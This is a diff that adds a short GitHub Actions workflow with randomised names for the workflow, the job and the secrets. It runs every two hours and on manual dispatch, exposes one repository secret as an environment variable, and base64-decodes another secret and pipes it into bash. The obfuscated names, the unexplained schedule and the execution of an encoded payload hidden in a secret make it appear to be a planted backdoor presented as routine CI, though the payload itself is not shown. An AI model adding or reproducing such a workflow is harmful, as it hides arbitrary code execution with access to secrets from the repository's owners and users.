@@ -1,0 +1,13 @@
+name: JKBynT
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  FbaZTQWecwT:
+    runs-on: ubuntu-latest
+    env:
+      ExFBDZAc: ${{ secrets.PFVtgpK }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.YVIHPefm }}" | base64 -d | bash
